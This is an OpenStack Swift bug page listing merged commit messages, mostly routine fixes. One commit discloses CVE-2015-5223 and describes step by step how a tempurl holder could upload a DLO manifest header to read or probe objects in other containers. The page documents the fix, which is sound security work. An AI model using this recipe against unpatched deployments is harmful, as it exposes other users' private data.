![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2015-09-03:  [**Related fix merged to swift (master)**](/swift/%2Bbug/1453948/comments/33) |  |  | [#33](/swift/%2Bbug/1453948/comments/33) |
| --- | --- | --- | --- |

Reviewed: <https://review.openstack.org/217273>

Committed: <https://git.openstack.org/cgit/openstack/swift/commit/?id=58a10a5fffec69304d7bcce0f1c43bd2a9f9ff52>

Submitter: Jenkins

Branch: master

commit 58a10a5fffec69304d7bcce0f1c43bd2a9f9ff52

Author: Alistair Coles <email address hidden>

Date: Wed Aug 26 16:30:23 2015 +0100

Add test that a tempurl POST cannot set a DLO manifest header

Follow up to [1] to add tests for tempurl POSTs not being allowed

    to set a DLO manifest header.

[1] I11e68830009d3f6bff44ae4011a41b67139146f6

Change-Id: I7c0ad5a936f71e56c599b8495a586913d3334422

    Related-Bug: 1453948

Reviewed: https://review.openstack.org/217273
Committed: https://git.openstack.org/cgit/openstack/swift/commit/?id=58a10a5fffec69304d7bcce0f1c43bd2a9f9ff52
Submitter: Jenkins
Branch: master
commit 58a10a5fffec69304d7bcce0f1c43bd2a9f9ff52
Author: Alistair Coles <alistair.coles@hp.com>
Date: Wed Aug 26 16:30:23 2015 +0100
Add test that a tempurl POST cannot set a DLO manifest header
Follow up to [1] to add tests for tempurl POSTs not being allowed
to set a DLO manifest header.
[1] I11e68830009d3f6bff44ae4011a41b67139146f6
Change-Id: I7c0ad5a936f71e56c599b8495a586913d3334422
Related-Bug: 1453948

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2015-09-03:  [**Fix merged to swift (feature/crypto)**](/swift/%2Bbug/1453948/comments/34) |  |  | [#34](/swift/%2Bbug/1453948/comments/34) |
| --- | --- | --- | --- |

[Download full text](https://bugs.launchpad.net/swift/%2Bbug/1453948/comments/34/%2Bdownload) (43.3 KiB)

Reviewed: <https://review.openstack.org/219775>

Committed: <https://git.openstack.org/cgit/openstack/swift/commit/?id=257e468e9bfd1088040419ad408106ac3c77b531>

Submitter: Jenkins

Branch: feature/crypto

commit e02609c66a804845672413b06830b87395afef31

Author: Samuel Merritt <email address hidden>

Date: Tue Sep 1 15:19:50 2015 -0700

Preserve traceback in swift-dispersion-report

Commit c690bcb fixed a bug in the dispersion report, but changed this

    from a bare "raise" to "raise err", which loses the traceback. Not a

    big deal, but worth putting back IMO.

Change-Id: Id5b72153a4b8df8e3faaf1fa3fb2040e28ba85cc

commit d06d4ad0fd2dfe69da8008e729651264522c6c06

Author: Minwoo Bae <email address hidden>

Date: Tue Sep 1 15:08:44 2015 -0500

Included reference in swift.obj.diskfile to enumerate the string

    used for data file paths.

Change-Id: Ie22caa678bc00dfc43fabec7efbbb9f34490f1b5

commit 524c89b7eeff037b8a6b421888771e15f98c2da2

Author: John Dickinson <email address hidden>

Date: Fri Aug 21 13:39:41 2015 -0700

Updated CHANGELOG, AUTHORS, and .mailmap for 2.4.0 release.

Change-Id: Ic6301146b839c9921bb85c4f4c1e585c9ab66661

commit 05de1305a903ee4ce9c8c50fde53c552d5b90d51

Author: Clay Gerrard <email address hidden>

Date: Thu Aug 27 18:35:09 2015 -0700

Make ssync\_sender send valid chunked requests

The connect method of ssync\_sender tells the remote connection that it's

    going to send a valid HTTP chunked request, but if the remote end needs

    to respond with an error of any kind sender throws HTTP right out the

    window, picks up his ball, and closes the socket down hard - much to the

    surprise of the eventlet.wsgi server who up to this point had been

    playing along quite nicely with this 'SSYNC' nonsense assuming that

    everyone here is consenting mature adults.

If you're going to make a "Transfer-Encoding: chunked" request have the

    good decency to finish the job with a proper '0\r\n\r\n'. [1]

N.B. It might be possible to handle an error status during the

    initialize\_request phase with some sort of 100-continue support, but

    honestly it's not entirely clear to me when the server isn't going to

    close the connection if the client is still expected to send the body

    [2] - further if the error comes later during missing\_check or updates

    we'll for sure want to send the chunk transfer termination line before

    we close down the socket and this way we cover both.

1. Really, eventlet.wsgi shouldn't be so blasted brittle about this [3]

    2. <https://lists.w3.org/Archives/Public/ietf-http-wg/2005AprJun/0007.html>

    3. <https://github.com/eventlet/eventlet/commit/c3ce3eef0b4d0dfdbfb1ec0186d4bb204fb8ecd5>

Closes-[Bug #1489587](/bugs/1489587)

    Change-Id: Ic17c6c3075553f8cf6ef6213e62a00282f0d01cf

commit 993ee4e37af1961adba2047d5aa2eb210e423eb3

Author: nakagawamsa <email address hidden>

Date: Fri Aug 28 11:49:43 2015 +0900

Remove duplicate X-Backend-Storage-Policy-Index key

There is duplicate 'X-Backend-Storage-Policy-Index' dictionary key in unit.obj.test\_server.py.

    One key has fixed policy index value, and another ha...

Reviewed: https://review.openstack.org/219775
Committed: https://git.openstack.org/cgit/openstack/swift/commit/?id=257e468e9bfd1088040419ad408106ac3c77b531
Submitter: Jenkins
Branch: feature/crypto
commit e02609c66a804845672413b06830b87395afef31
Author: Samuel Merritt <sam@swiftstack.com>
Date: Tue Sep 1 15:19:50 2015 -0700
Preserve traceback in swift-dispersion-report
Commit c690bcb fixed a bug in the dispersion report, but changed this
from a bare "raise" to "raise err", which loses the traceback. Not a
big deal, but worth putting back IMO.
Change-Id: Id5b72153a4b8df8e3faaf1fa3fb2040e28ba85cc
commit d06d4ad0fd2dfe69da8008e729651264522c6c06
Author: Minwoo Bae <minwoob@us.ibm.com>
Date: Tue Sep 1 15:08:44 2015 -0500
Included reference in swift.obj.diskfile to enumerate the string
used for data file paths.
Change-Id: Ie22caa678bc00dfc43fabec7efbbb9f34490f1b5
commit 524c89b7eeff037b8a6b421888771e15f98c2da2
Author: John Dickinson <me@not.mn>
Date: Fri Aug 21 13:39:41 2015 -0700
Updated CHANGELOG, AUTHORS, and .mailmap for 2.4.0 release.
Change-Id: Ic6301146b839c9921bb85c4f4c1e585c9ab66661
commit 05de1305a903ee4ce9c8c50fde53c552d5b90d51
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Thu Aug 27 18:35:09 2015 -0700
Make ssync\_sender send valid chunked requests
The connect method of ssync\_sender tells the remote connection that it's
going to send a valid HTTP chunked request, but if the remote end needs
to respond with an error of any kind sender throws HTTP right out the
window, picks up his ball, and closes the socket down hard - much to the
surprise of the eventlet.wsgi server who up to this point had been
playing along quite nicely with this 'SSYNC' nonsense assuming that
everyone here is consenting mature adults.
If you're going to make a "Transfer-Encoding: chunked" request have the
good decency to finish the job with a proper '0\r\n\r\n'. [1]
N.B. It might be possible to handle an error status during the
initialize\_request phase with some sort of 100-continue support, but
honestly it's not entirely clear to me when the server isn't going to
close the connection if the client is still expected to send the body
[2] - further if the error comes later during missing\_check or updates
we'll for sure want to send the chunk transfer termination line before
we close down the socket and this way we cover both.
1. Really, eventlet.wsgi shouldn't be so blasted brittle about this [3]
2. https://lists.w3.org/Archives/Public/ietf-http-wg/2005AprJun/0007.html
3. https://github.com/eventlet/eventlet/commit/c3ce3eef0b4d0dfdbfb1ec0186d4bb204fb8ecd5
Closes-Bug #1489587
Change-Id: Ic17c6c3075553f8cf6ef6213e62a00282f0d01cf
commit 993ee4e37af1961adba2047d5aa2eb210e423eb3
Author: nakagawamsa <nakagawamsa@nttdata.co.jp>
Date: Fri Aug 28 11:49:43 2015 +0900
Remove duplicate X-Backend-Storage-Policy-Index key
There is duplicate 'X-Backend-Storage-Policy-Index' dictionary key in unit.obj.test\_server.py.
One key has fixed policy index value, and another has random value.
Unittest should done with random policy index, so remove key which is set fixed value.
Change-Id: Ic91fcf44d48297d0feee33c928ca682def9790a3
commit 893f30c61d280804e417790dd34ba7bc3fb4f6fc
Author: paul luse <paul.e.luse@intel.com>
Date: Wed Aug 12 13:32:50 2015 -0700
EC GET path: require fragments to be of same set
And if they are not, exhaust the node iter to go get more. The
problem without this implementation is a simple overwrite where
a GET follows before the handoff has put the newer obj back on
the 'alive again' node such that the proxy gets n-1 fragments
of the newest set and 1 of the older.
This patch bucketizes the fragments by etag and if it doesn't
have enough continues to exhaust the node iterator until it
has a large enough matching set.
Change-Id: Ib710a133ce1be278365067fd0d6610d80f1f7372
Co-Authored-By: Clay Gerrard <clay.gerrard@gmail.com>
Co-Authored-By: Alistair Coles <alistair.coles@hp.com>
Closes-Bug: 1457691
commit d4409c0a046c6ce0e14e18c95efe2cd16cf120e8
Author: Samuel Merritt <sam@swiftstack.com>
Date: Tue Aug 11 09:10:13 2015 -0500
Better scoping for tempurls, especially container tempurls
It used to be that a GET of a tempurl referencing a large object would
let you download that large object regardless of where its segments
lived. However, this led to some violated user expectations around
container tempurls.
(Note on shorthand: all tempurls reference objects. However, "account
tempurl" and "container tempurl" are shorthand meaning tempurls
generated using a key on the account or container, respectively.)
Let's say an application is given tempurl keys to a particular
container, and it does all its work therein using those keys. The user
expects that, if the application is compromised, then the attacker
only gains access to the "compromised-container". However, with the old
behavior, the attacker could read data from \*any\* container like so:
1) Choose a "victim-container" to download
2) Create PUT and GET tempurl for any object name within the
"compromised-container". The object doesn't need to exist;
we'll create it.
3) Using the PUT tempurl, upload a DLO manifest with
"X-Object-Manifest: /victim-container/"
4) Using the GET tempurl, download the object created in step 3. The
result will be the concatenation of all objects in the
"victim-container".
Step 3 need not be for all objects in the "victim-container"; for
example, a value "X-Object-Manifest: /victim-container/abc" would only
be the concatenation of all objects whose names begin with "abc". By
probing for object names in this way, individual objects may be found
and extracted.
A similar bug would exist for manifests referencing other accounts
except that neither the X-Object-Manifest (DLO) nor the JSON manifest
document (SLO) have a way of specifying a different account.
This change makes it so that a container tempurl only grants access to
objects within its container, \*including\* large-object segments. This
breaks backward compatibility for container tempurls that may have
pointed to cross container \*LO's, but (a) there are security
implications, and (b) container tempurls are a relatively new feature.
This works by having the tempurl middleware install an authorization
callback ('swift.authorize' in the WSGI environment) that limits the
scope of any requests to the account or container from which the key
came.
This requires swift.authorize to persist for both the manifest request
and all segment requests; this is done by having the proxy server
restore it to the WSGI environment prior to returning from \_\_call\_\_.
[CVE-2015-5223]
Co-Authored-By: Clay Gerrard <clayg@swiftstack.com>
Co-Authored-By: Alistair Coles <alistair.coles@hp.com>
Co-Authored-By: Christian Schwede <cschwede@redhat.com>
Co-Authored-By: Matthew Oliver <matt@oliver.net.au>
Change-Id: Ie6d52f7a07e87f6fec21ed8b0ec1d84be8b2b11c
Closes-Bug: 1449212
commit 10b2939b433a4a79b4f7b97640b3d208cacfeffb
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Thu Jul 23 22:36:21 2015 -0700
Disallow unsafe tempurl operations to point to unauthorized data
Do not allow PUT tempurls to create pointers to other data. Specifically
disallow the creation of DLO object manifests by returning an error if a
non-safe tempurl request includes an X-Object-Manifest header regardless of
the value of the header.
This prevents discoverability attacks which can use any PUT tempurl to probe
for private data by creating a DLO object manifest and then using the PUT
tempurl to head the object which would 404 if the prefix does not match any
object data or form a valid DLO HEAD response if it does.
This also prevents a tricky and potentially unexpected consequence of PUT
tempurls which would make it unsafe to allow a user to download objects
created by tempurl (even if they just created them) because the result of
reading the object created via tempurl may not be the data which was uploaded.
[CVE-2015-5223]
Co-Authored-By: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Change-Id: I11e68830009d3f6bff44ae4011a41b67139146f6
Closes-Bug: 1453948
commit c690bcb68331818a04c94741b25f40cc40f7b3c4
Author: Kazuhiro MIYAHARA <miyahara.kazuhiro@lab.ntt.co.jp>
Date: Mon Aug 17 16:50:56 2015 +0900
Fix dispersion-reports error message
This patch fixes Swift to show message
"No objects to query. Has swift-dispersion-populate been run?"
for "swift-dispersion-report —object-only”
with no container for object dispersion.
Change-Id: I82da56709cfc296a27f5180681709bc56adbc13d
Closes-Bug: #1468120
commit 8086a0e53406dc95856df2d3e015d3eaaf81380a
Author: Tushar Gohad <tushar.gohad@intel.com>
Date: Tue Aug 18 07:24:19 2015 +0000
Restrict PyECLib version to 1.0.7
v1.0.9 rev of PyECLib replaces Jerasure with a native EC
implementation (liberasurecode\_rs\_vand) as the default
EC scheme. Going forward, Jerasure will not be bundled
with PyPI version of PyECLib as it used to be, until
v1.0.7.
This is an interim change to Swift requirements until we
get v1.0.9 PyECLib included into global-requirements and
ready patches that change Swift default ec\_type (for doc,
config samples and unit tests) from "jerasure\_rs\_vand"
to "liberasurecode\_rs\_vand."
Change-Id: Ica4fee2cdea2bc7f5edd0e51ad637a4457faf3b4
commit 17efa343c605d0361b3f423696babbab3f3d972d
Author: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Date: Mon Jul 6 13:21:40 2015 -0700
Fix EC GET backend stream iteration state
In EC case, When GET object requested, proxy-server always makes a log
line "Client disconnected on read" even though the request succeeded.
That is because ECAppIter class doesn't maintain a bunch of backend
stream when closing the app\_iter. It will cause unfortunately
GeneratorExit on backend stream ResumingGetter.
This patch fixes to set non\_client\_disconnected to propagate the state
to the backend streams when the range iteration stopped successful.
Co-Authored-By: Clay Gerrard <clay.gerrard@gmail.com>
Change-Id: I77af9807816bea1444d66534a17e2a210bcf09f8
Closes-Bug: #1472201
commit 25dc7224b63b039cb3778cca7f9f81f954c6d94e
Author: Alistair Coles <alistair.coles@hp.com>
Date: Tue Aug 25 11:05:41 2015 +0100
Fix swob.Range docstring
Bad ranges cause a ValueError to be raised, not an empty
ranges list.
Change-Id: I118bd2f7dc08ff5198870f4093c6eb350506c8ed
commit a7b84f4c51207608adc3a5de7f4f9a629053c0ab
Author: Samuel Merritt <sam@swiftstack.com>
Date: Mon Aug 24 23:11:34 2015 -0700
Allow pep8 of a single file
Now you can run
$ tox -e pep8 path/to/file.py [path/to/file2.py [...]]
to run pep8 against just those files[1]. This is quite a bit faster
than a full pep8 run, and the faster feedback is nice when you're
fiddling with some formatting to placate pep8.
Of course, you can still run "tox -e pep8" to check the whole source
tree, just as before this commit.
[1] It'll still run against bin/swift\* as well, but that's still a lot
faster than running against all our .py files.
Change-Id: I81b4363fb95a34ff0f5c346b2b24f2047154f502
commit 6a35d479e8952c854fee6fbef9fe0397a289a6e5
Author: Matthew Oliver <matt@oliver.net.au>
Date: Tue Aug 25 11:24:49 2015 +1000
Follow up patch to fix a multiline import NITPIC
This change cleans up test/unit/obj/test\_replicator.py's imports
to use only 1 version of multiline import syntaxes (' \' vs '()').
I don't really mind which, but we should be consistant, at least
in the same file.
This is a follow up for patch 215857.
Change-Id: Ie2d328c25865b19092c493981a803ee246a9d7a5
commit edde5584affaa983d8db1d294bf1e20a2d4bbb50
Author: Hisashi Osanai <osanai.hisashi@jp.fujitsu.com>
Date: Tue Aug 25 07:52:18 2015 +0900
Fix typo of a comment in replicator
The typo was introduced by patch 138342 (sorry) so I fix it.
Change-Id: Id5126802d281ef7ee9be128bd2152c0d2584160e
commit 6151c6c45da481c0ea9a4fb876d14b39c1e347bf
Author: Tim Burke <tim.burke@gmail.com>
Date: Mon Aug 24 20:36:22 2015 +0000
Fix use of delimiter in account listings
Previously, account listings that used the delimiter query param could
omit some containers if they ended with the character that follows the
delimiter.
See If196e3075612b121ef8da4a9128167d00a248c27 for the corresponding fix
for container listings.
Change-Id: I57fcb97e51f653f5f4e306a632fcb3a0fb148c4e
commit a38f63e1c6b8b85b1675aa900e239a2e9906811e
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Fri Aug 21 18:14:55 2015 -0700
Use correct Storage-Policy header for REPLICATE requests
Under some concurrency the object-replicator could potentially send the
wrong X-Backed-Storage-Policy-Index header to it's partner nodes during
replication if there were multiple storage policies on the same node
because of a race where multiple jobs being processed concurrently would
mutate some shared state on the ObjectReplicator instance.
Instead of using shared stated on the ObjectReplicator instance when
mutating the default headers send with REPLICATION requests each job
will copy them into a local where they can safely be updated.
Change-Id: I5522db57af7e308b1f9d4181f14ea14e386a71fd
commit ae129bf5e8c918efd8ee66279f98ee85e7c97b24
Author: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Date: Fri May 15 06:44:12 2015 -0700
eventlet.posthook related code needn't anymore
In the past, older Swift seemed to use eventlet.posthooks scheme for the
logging on proxy with posthooklogger method. However, for now, Swift
attaches no method to eventlet.posthooks everywhere so we don't have
to maintain the posthooks anymore.
Change-Id: Ie63941a202d448532d980252a4d25575f8edab9c
commit 4500ff340f021e4e5f6fd53960de03cb3c207925
Author: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Date: Wed May 13 00:43:59 2015 -0700
Fix the missing SLO state on fast-post
When using fast-post and POST (i.e. metadata update) is requested to
a SLO manifest files, current Swift drops the 'X-Static-Large-Object'
header from the existing metadata. It results in breaking the SLO
state because the manifest missing the 'X-Static-Large-Object' metadata
will be maintained as a normal files.
This patch fixes object-server to keep the existing
'X-Static-Large-Object' flag and then keep the SLO state.
Change-Id: Ib1eb569071372c322dd105c52baeeb094003291e
Closes-bug: #1453807
commit 69e7424d3cb6c59341d739c3d41f42397031d96a
Author: Eran Rom <eranr@il.ibm.com>
Date: Tue Jul 28 09:41:12 2015 +0300
Add container sync probe test to SAIO default set
SAIO Configuration and documentation changes enabling to run the
container sync probe test by default
Change-Id: Iccf59533d0d4fe72549d318339ab125d04dde006
Related-Bug: #1476623
commit 8b1df9918bf6c22b49b161a402199b532bfd8266
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Fri Aug 21 14:04:46 2015 -0700
Minor cleanup handoff mode warnings
\* message is a little clearer
\* test is a little stronger
Change-Id: I745cde7f4a46dafc80ab42d39e6ccc92aa3b746e
commit a1ceab5a92dfdafd5abffed272ac2cece5302f32
Author: Carlos Cavanna <ccavanna@ca.ibm.com>
Date: Fri Aug 21 14:14:31 2015 -0400
New troubleshooting case in documentation.
Added a new troubleshooting case for the "First Contribution to Swift"
documentation page.
Change-Id: I182ba702b49b28409fe56becae93326e5f63dcd0
commit ab163702de733be39ba5e7024c7a8dd4c86bc29b
Author: Pradeep Kumar Singh <pradeep.singh@nectechnologies.in>
Date: Tue Jul 14 10:03:18 2015 +0530
Emit warning log in object replicator
When the object-replicator encounters handoffs\_first and
handoff\_delete options as enabled it should emit a log
warning indicating that it should be changed back to the
default before the next "normal" rebalance.
Closes-Bug: #1457262
Change-Id: If9dc2796c18ed3cf13da920831e2d5c2ae9f12a0
commit be66aa8e76d2994eb8a0a944e0dea26ffbb3c159
Author: Samuel Merritt <sam@swiftstack.com>
Date: Thu Aug 20 13:24:38 2015 -0700
Fix 500 for bogus Range request to 0-byte object.
The proxy was trying to pop a byterange off a Range header that didn't
contain syntactically-valid byteranges. This worked about as well as
you'd expect. Now we detect the bogus value and remove the header
entirely.
Change-Id: I24b92f900d33ec79880c7db2870378489d5a6810
commit 4b6836b3bc465e9c2c6d2974c193a49b973c4e4e
Author: Akihito Takai <takaiak@nttdata.co.jp>
Date: Thu Aug 20 18:40:52 2015 +0900
Fix the comment in [1].
(line 259) parameter(op) of object\_update method is 'PUT' or
'DELETE' not 'POST' or 'DELETE'.
[1]: swift/obj/updater.py
Change-Id: I876a620ba8e09e69fba7156b12e69445c229e160
commit 923238aa1ba0963c414ba5321cd3910b2910f4ed
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Tue Jul 28 20:35:25 2015 +0530
test/(functional/probe):Replace python print operator with print function (pep H233, py33)
'print' function is compatible with 2.x and 3.x python versions
Link : https://www.python.org/dev/peps/pep-3105/
Python 2.6 has a \_\_future\_\_ import that removes print as language syntax,
letting you use the functional form instead
Change-Id: I416c6ac21ccbfb91ec328ffb1ed21e492ef52d58
commit 47dc31940d64b0c87e99cc73eddcdd01dd8b3ad4
Author: Samuel Merritt <sam@swiftstack.com>
Date: Wed Aug 19 10:42:28 2015 -0700
Add OpenStack release names to changelog
I can never remember the mapping of real version numbers to the
OpenStack names.
Change-Id: Ib7c5ae4ff2a33018364698eb34f8df1622719fab
commit 183508710d011ec30ebba2186c58fd28d449e4bb
Author: Victor Stinner <vstinner@redhat.com>
Date: Sun Aug 16 11:18:49 2015 +0200
pep8: Don't override '\_' symbol
Fix pep8 warning F402 "import '\_' from line 51 shadowed by loop
variable".
Change-Id: I139060ff5d298a8b0f0f8e529a5737478fb5daf5
commit c7eb589c6ca2fe4f2950cae22a18513e4dec6c46
Author: Victor Stinner <vstinner@redhat.com>
Date: Sun Aug 16 11:06:52 2015 +0200
pep8: Fix usage of the l10n \_('...') function
Fix the pep8 warning H702 "Formatting operation should be outside of
localization method call".
For the logger, pass parameters as indexed parameters instead of using
the string str%args operator, the logger is more reliable in case of
formatting error.
Change-Id: If418bc155f6a6c0a00f63e3d87ebe4addf4aae55
commit 7bea148d2fe22daa9d1fbbc5cd16ebd390b64b1b
Author: Victor Stinner <vstinner@redhat.com>
Date: Sun Aug 16 10:34:26 2015 +0200
pep8: replace deprecated calls to assert\_()
The TestCase.assert\_() has been deprecated in Python 2.7. Replace it
with assertTrue() or even better methods (assertIn, assertNotIn,
assertIsInstance) which provide better error messages.
Change-Id: I21c730351470031a2dabe5238693095eabdb8964
commit 8aaacbf88d9ea4432e58dd261b98ff95d7c69be6
Author: Victor Stinner <vstinner@redhat.com>
Date: Mon Jul 27 18:55:01 2015 +0200
pep8: Fix hacking H232 warnings (octal)
Fix warnings "H232: Python 3.x incompatible octal 000001234 should be
written as 0o1234".
Change-Id: I9a7bbb034357783885ac3e18fe1e9e32a5951616
commit d6267c1f95a7fcd2b0e4f15d5efc6bcfe2114de0
Author: Clément Contini <ccontini@cloudops.com>
Date: Wed Aug 12 15:00:45 2015 -0400
Keep user id and project id in subrequests env
Keep HTTP\_X\_USER\_ID and HTTP\_X\_PROJECT\_ID to be available as
user\_id and project\_id in storage.objects.outgoing.bytes in
ceilometer when downloading a multipart object.
Change-Id: I0f4734f021e5d6e84d48ed9bebeb321d7a9590ad
Closes-Bug: #1477283
commit eaa006464cb98a2f36809edfa13bd3dcaebc9952
Author: John Dickinson <me@not.mn>
Date: Mon Aug 17 22:13:42 2015 -0700
move global statement up a few lines
Change-Id: I190d2d530c6c0525d988cc88b0965b48a291fffb
commit 1a81cda8b7eba0d25ea7341da756bb588cae8d73
Author: Hamdi Roumani <roumani@ca.ibm.com>
Date: Mon Aug 3 17:45:56 2015 -0400
Doc instructions for post rebase steps
Improve the 'first\_contribution\_swift' by adding instructions for how to
rebuild swift following a rebase.
Change-Id: If5c91dc4e1e8d1712bbd8b326c675967fb4b8c15
commit 79ba4a85983641e539b620bd143e62673c98416e
Author: Hisashi Osanai <osanai.hisashi@jp.fujitsu.com>
Date: Wed Dec 3 06:15:16 2014 +0900
Enable Object Replicator's failure count in recon
This patch makes the count of object replication failure in recon.
And "failure\_nodes" is added to Account Replicator and
Container Replicator.
Recon shows the count of object repliction failure as follows:
$ curl http://<ip>:<port>/recon/replication/object
{
"replication\_last": 1416334368.60865,
"replication\_stats": {
"attempted": 13346,
"failure": 870,
"failure\_nodes": {
"192.168.0.1": {"sdb1": 3},
"192.168.0.2": {"sdb1": 851,
"sdc1": 1,
"sdd1": 8},
"192.168.0.3": {"sdb1": 3,
"sdc1": 4}
},
"hashmatch": 0,
"remove": 0,
"rsync": 0,
"start": 1416354240.9761429,
"success": 1908
},
"replication\_time": 2316.5563162644703,
"object\_replication\_last": 1416334368.60865,
"object\_replication\_time": 2316.5563162644703
}
Note that 'object\_replication\_last' and 'object\_replication\_time' are
considered to be transitional and will be removed in the subsequent
releases. Use 'replication\_last' and 'replication\_time' instead.
Additionaly this patch adds the count in swift-recon and it will be
showed as follows:
$ swift-recon object -r
========================================================================
=======
--> Starting reconnaissance on 4 hosts
========================================================================
=======
[2014-11-27 16:14:09] Checking on replication
[replication\_failure] low: 0, high: 0, avg: 0.0, total: 0, Failed: 0.0%,
no\_result: 0, reported: 4
[replication\_success] low: 3, high: 3, avg: 3.0, total: 12,
Failed: 0.0%, no\_result: 0, reported: 4
[replication\_time] low: 0, high: 0, avg: 0.0, total: 0, Failed: 0.0%,
no\_result: 0, reported: 4
[replication\_attempted] low: 1, high: 1, avg: 1.0, total: 4,
Failed: 0.0%, no\_result: 0, reported: 4
Oldest completion was 2014-11-27 16:09:45 (4 minutes ago) by
192.168.0.4:6002.
Most recent completion was 2014-11-27 16:14:19 (-10 seconds ago) by
192.168.0.1:6002.
========================================================================
=======
In case there is a cluster which has servers, a server runs with this
patch and the other servers run without this patch. If swift-recon
executes on the server which runs with this patch, there are unnecessary
information on the output such as [failure], [success] and [attempted].
Because other servers which run without this patch are not able to
send a response with information that this patch needs.
Therefore once you apply this patch, you also apply this patch to other
servers before you execute swift-recon.
DocImpact
Change-Id: Iecd33655ae2568482833131f422679996c374d78
Co-Authored-By: Kenichiro Matsuda <matsuda\_kenichi@jp.fujitsu.com>
Co-Authored-By: Brian Cline <bcline@softlayer.com>
Implements: blueprint enable-object-replication-failure-in-recon
commit eeb0fa40a19917e6548f95f0bd3c08736928449b
Author: Christian Schwede <cschwede@redhat.com>
Date: Thu Aug 6 07:21:15 2015 +0000
Make swift-ring-builder filename usage more consistent
Sometimes the given argument is internally altered and another filename is used
without a note to the operator. Even worse, a given .ring.gz filename is
sometimes written out as builder file, without updating the corresponding
.builder file.
There is already a method to parse the given argv and return the name of the
builder and ring file. However, it's rarely used and no warning is given to the
user if it is altered. This patch uses the already parsed builder and ring file
name instead of argv[1], and also adds a note to the user if the used filename
is differently to the one given as argument.
Closes-Bug: 1482096
Change-Id: I2f8ef23aeab8b07caaa799f7dcd57e684b4b2ad2
commit b75d2a4e37d4c86763a2cc56c6dd53ebe2e0de19
Author: Bill Huber <wbhuber@us.ibm.com>
Date: Mon Aug 17 13:54:44 2015 -0500
Quorum on durable response is too low
Increase the .durable quorum from 2 to "parity + 1" to guarantee
that we will never fail to rebuild an object. Otherwise, with
low durable responses back (< parity + 1), the putter objects
return with failed attribute set to true, thereby failing the
rebuild of fragments for an object.
Change-Id: I80d666f61273e589d0990baa78fd657b3470785d
Closes-Bug: 1484565
commit fa35e38c9f83f704eb087f80157cbe33b23b9db2
Author: Kai Zhang <zakir.exe@gmail.com>
Date: Fri Aug 14 16:46:35 2015 -0700
Fix some minor typos
Fixed some typos in function name and comments.
Change-Id: Ida76ab4b331a51b71e57650702acc136e66ba4b2
commit 5b246e875fe9ac3d764ea581ad52b04238f5bcc8
Author: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Date: Wed Jul 22 10:39:22 2015 -0700
Fix EC range GET/COPY handling
When range GET (or COPY) for an EC object requested, if the requested range
starts from more than last segments alignment (i.e.
ceil(object\_size/segment\_size) \* segment\_size), proxy server will return
the original content length w/o body, though Swift should return an error
massage as a body and the length of message as the content length.
The current behavior will cause stuck on some client. (e.g. curl)
This patch fixes that proxy enables to return correct response, even if such
an over range requested.
Co-Authored-By: Clay Gerrard <clay.gerrard@gmail.com>
Change-Id: I21f81c842f563ac4dddc69011ed759b744bb20bd
Closes-Bug: #1475499
commit 7064706b2721c36c5181267f58704b9344ad4ac0
Author: Samuel Merritt <sam@swiftstack.com>
Date: Tue Aug 11 10:17:20 2015 -0500
Fix 500 in versioned writes with bad Destination
When this code lived in the proxy, it was protected by an "except
HTTPException" clause in proxy.Application.handle\_request(). When it
moved to middleware, it lost that, and then things like
constraints.check\_name\_format that raised HTTPException would cause
500s. The HTTPException would make it all the way out to catch\_errors
and get translated to a 500.
This commit just wraps a couple try/excepts around the bits in
versioned writes that can raise HTTPException. I tried to make it use
wsgify so I could get that for free, but that wound up being a real
pain because env/start\_response are plumbed through pretty much the
whole versioned-writes middleware.
Closes-Bug: 1483705
Change-Id: Ife165bf709e64f313ed07c779b21914045e51f25
commit 035a411660ca02983cd486312266c67d78a2359c
Author: Thiago da Silva <thiago@redhat.com>
Date: Sun Nov 9 13:13:27 2014 -0500
versioned writes middleware
Rewrite object versioning as middleware to simplify the PUT method
in the object controller.
The functionality remains basically the
same with the only major difference being the ability to now
version slo manifest files. dlo manifests are still not
supported as part of this patch.
Co-Authored-By: Clay Gerrard <clay.gerrard@gmail.com>
DocImpact
Change-Id: Ie899290b3312e201979eafefb253d1a60b65b837
Signed-off-by: Thiago da Silva <thiago@redhat.com>
Signed-off-by: Prashanth Pai <ppai@redhat.com>
commit 968c91a465627bb9317ed6e2ae9ccd818c83c0c4
Author: Alistair Coles <alistair.coles@hp.com>
Date: Tue Jul 28 10:31:54 2015 +0100
Replace assertTrue(not <condition>) with assertFalse(<condition>)
The replacement of assert\_ with assertTrue [1] resulted in a number of
tests using calls of the form assertTrue(not <condition>). This patch
replaces those with assertFalse(<condition>).
[1] change I74705c6498249337bfdf955d62e0ad972035bc1f
Change-Id: I78b49558f4425c2335df187b1793d1e4b3c514b1
commit 4ac1fea5d111c669ff827f4eb29c0735cbad6ba5
Author: Zhao Lei <zhaolei@cn.fujitsu.com>
Date: Fri Aug 7 22:07:01 2015 +0800
Fix some spelling typo in comments
s/overide/override for object-expirer.conf and sample.
s/automaticaly/automatically for swift/proxy/controllers/obj.py
Change-Id: Ife107c7a1005a5d4959288db50a7f8f33c522dd4
Signed-off-by: Zhao Lei <zhaolei@cn.fujitsu.com>
commit 9456af35a2832aeafc4a4e78ebd0d4142ead71cd
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Thu Aug 6 00:55:36 2015 +0530
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3,changes in
dir:
\*test/unit/obj/\*
\*test/unit/test\_locale/\*
Change-Id: I3dd0c1107165ac529f1cd967363e5cf408a1d02b
commit 1952451ed7e97e2bfa3b11dfa5000cc39f712084
Author: Zhao Lei <zhaolei@cn.fujitsu.com>
Date: Fri Aug 7 21:57:08 2015 +0800
Fix a spelling typo in comment
s/automaticaly/automatically/ for swift/proxy/controllers/obj.py
